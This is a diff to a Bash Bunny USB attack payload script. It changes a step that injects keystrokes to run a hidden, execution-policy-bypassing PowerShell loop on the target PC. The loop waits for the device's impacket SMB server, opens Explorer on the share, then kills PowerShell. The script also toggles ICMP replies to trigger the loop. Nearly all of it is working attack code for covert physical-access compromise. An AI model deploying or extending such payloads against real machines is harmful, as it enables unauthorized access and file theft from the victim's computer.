@@ -105,7 +105,7 @@ do
 				echo "+ Launching file browser to SMB server.." >> $LOG_FILE
 				# Just wanna start powershell real quick..(sets up a loop to wait for the Bunny to get ready, then starts Windows Explorer - pointed at the SMB server)
 				ATTACKMODE HID
-				RUN WIN "powershell -WindowStyle Hidden -Exec Bypass \"while (\$true) { If ((New-Object net.sockets.tcpclient ($HOST_IP,445)).Connected) { ii \\\\$HOST_IP\\s; exit }\""
+				RUN WIN "powershell -WindowStyle Hidden -Exec Bypass \"while (\$true) { If ((New-Object net.sockets.tcpclient ($HOST_IP,445)).Connected) { sleep -s 5; ii \\\\$HOST_IP\\s; taskkill /IM powershell.exe; exit } }\""
 				# Okay, back to business..
 				ATTACKMODE RNDIS_ETHERNET
 				echo "+ Setting up SMB environment.." >> $LOG_FILE
@@ -113,12 +113,8 @@ do
 				echo "+ Attempting to launch SMB.." >> $LOG_FILE
 				python /tools/impacket/examples/smbserver.py -comment "Who needs a locker when you have a server?" s $PAYLOAD_DIR/ww &
 				echo "+ SMB server started" >> $LOG_FILE
-				sleep 4
 				# Trip the powershell loop (suddenly we can see the Bunny!)
 				echo "0" > /proc/sys/net/ipv4/icmp_echo_ignore_all
-				sleep 2
-				# Hide, Bunny, hide!
-				echo "1" > /proc/sys/net/ipv4/icmp_echo_ignore_all
 				echo "+ Waiting for commands.." >> $LOG_FILE
 				LED C SLOW
 			fi
